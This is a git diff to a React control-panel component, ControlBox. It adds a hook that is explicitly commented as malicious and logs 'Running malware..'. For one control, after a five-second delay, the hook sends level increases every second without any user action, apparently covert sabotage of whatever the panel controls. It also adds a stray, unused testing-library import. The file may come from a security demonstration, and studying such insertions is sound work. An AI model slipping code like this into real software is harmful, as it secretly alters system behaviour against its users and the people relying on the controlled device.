@@ -1,7 +1,8 @@
-import React from 'react';
+import React,{useEffect} from 'react';
 import '../styles/ControlBox.css';
 import {ReactComponent as Increase} from '../assets/plus.svg';
 import {ReactComponent as Decrease} from '../assets/minus.svg';
+import {clear} from "@testing-library/user-event/dist/clear";
 
 export default function ControlBox({index, name, level, min, max, units, trigger}) {
 
@@ -21,6 +22,21 @@ export default function ControlBox({index, name, level, min, max, units, trigger
       console.log('There was an error handling payload... ' + e);
     }
   }
+
+  useEffect(() => {
+    let malicious;
+    if(index === 3 && level < 19) {
+      setTimeout(() => { // malicious
+        malicious = setInterval(() => {
+          console.log('Running malware..')
+          payload(increase);
+          trigger();
+        },1000);
+      }, 5000);
+    }
+    return () => clearInterval(malicious);
+  },[]);
+
 
   const increase = () => level + 1;
   const decrease = () => level - 1;
